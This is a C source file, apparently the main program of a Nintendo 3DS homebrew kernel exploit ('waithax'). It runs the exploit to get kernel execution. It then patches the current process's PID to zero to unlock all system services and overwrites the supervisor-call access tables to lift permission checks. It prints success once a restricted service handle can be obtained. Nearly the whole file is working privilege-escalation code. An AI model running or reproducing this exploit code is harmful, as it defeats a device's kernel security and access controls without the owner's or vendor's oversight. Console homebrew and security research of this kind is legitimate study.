#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include "waithax.h"


// Shamelessly copied from
// https://github.com/Steveice10/memchunkhax2/blob/master/source/memchunkhax2.c#L16

#define OLDNEW(x)                    (g_is_new3ds ? x ## _NEW : x ## _OLD)

#define CURRENT_KTHREAD              (*((u8**)0xFFFF9000))
#define CURRENT_KPROCESS             (*((u8**)0xFFFF9004))

#define SVC_ACL_SIZE                 (0x10)

#define KPROCESS_ACL_START_OLD       (0x88)
#define KPROCESS_ACL_START_NEW       (0x90)

#define KPROCESS_PID_OFFSET_OLD      (0xB4)
#define KPROCESS_PID_OFFSET_NEW      (0xBC)

#define KTHREAD_THREADPAGEPTR_OFFSET (0x8C)
#define KSVCTHREADAREA_BEGIN_OFFSET  (0xC8)


static bool g_is_new3ds = 0;
static u32 g_original_pid;

static void K_PatchPID(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	u8 *proc = CURRENT_KPROCESS;
	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

	g_original_pid = *pidPtr;

	// We're now PID zero, all we have to do is reinitialize the service manager in user-mode.
	*pidPtr = 0;
}

static void K_RestorePID(void)
{
	// Turn interrupts off
	__asm__ volatile("cpsid aif");

	u8 *proc = CURRENT_KPROCESS;
	u32 *pidPtr = (u32*)(proc + OLDNEW(KPROCESS_PID_OFFSET));

	// Restore the original PID
	*pidPtr = g_original_pid;
}

static void K_PatchACL(void)
{
	// Patch the process first (for newly created threads).
	u8 *proc = CURRENT_KPROCESS;
	u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
	memset(procacl, 0xFF, SVC_ACL_SIZE);

	// Now patch the current thread.
	u8 *thread = CURRENT_KTHREAD;
	u8 *thread_pageend = *(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET);
	u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
	memset(thread_page, 0xFF, SVC_ACL_SIZE);
}


void initsrv_allservices(void)
{
	printf("Patching PID\n");
	waithax_backdoor(K_PatchPID);

	printf("Reiniting srv:\n");
	srvExit();
	srvInit();

	// Not restoring the PID because we want it to stay like this if the next
	// started homebrew reinits srv or something similar.
	// Comment this return if you want/need to restore the PID.
	return;

	printf("Restoring PID\n");
	waithax_backdoor(K_RestorePID);
}

void patch_svcaccesstable(void)
{
	printf("Patching SVC access table\n");
	waithax_backdoor(K_PatchACL);
}

int main(int argc, char **argv)
{
	Handle amHandle = 0;
	Result res;
	bool success = false;

	gfxInitDefault();
	consoleInit(GFX_TOP, NULL);
	nsInit();
	aptInit();

	APT_CheckNew3DS(&g_is_new3ds);
	printf("System type: %s\n", g_is_new3ds ? "New" : "Old");

	// This one should fail
	res = srvGetServiceHandleDirect(&amHandle, "am:u");
	printf("am:u 1st try: res=%08lx handle=%08lx\n", res, amHandle);
	if(amHandle)
		svcCloseHandle(amHandle);

	// Uncomment this to use svcBackdoor instead of waiting for the refcount to
	// be overflown. This needs svcBackdoor to be re-implemented on 11.0+ and
	// the SVC access tables or table checks to be patched.
	//waithax_debug(true);

	// Run the exploit
	printf("Running exploit\n\n");
	success = waithax_run();

	printf("\nExploit returned: %s\n", success ? "Success!" : "Failure.");
	if(!success)
		goto end;

	initsrv_allservices();
	patch_svcaccesstable();

	printf("Cleaning up\n");
	waithax_cleanup();

	// This one hopefully won't
	res = srvGetServiceHandleDirect(&amHandle, "am:u");
	printf("am:u 2nd try: res=%08lx handle=%08lx\n\n", res, amHandle);
	if(amHandle)
		svcCloseHandle(amHandle);

	if(res == 0)
		printf("The exploit succeeded. You can now exit this and run another app needing elevated permissions.\n");

end:
	printf("Press START to exit.\n");

	while(aptMainLoop())
	{
		hidScanInput();
		if(hidKeysDown() & KEY_START)
			break;

		gfxFlushBuffers();
		gfxSwapBuffers();
		gspWaitForVBlank();
	}

	aptExit();
	nsExit();
	gfxExit();
	return 0;
}
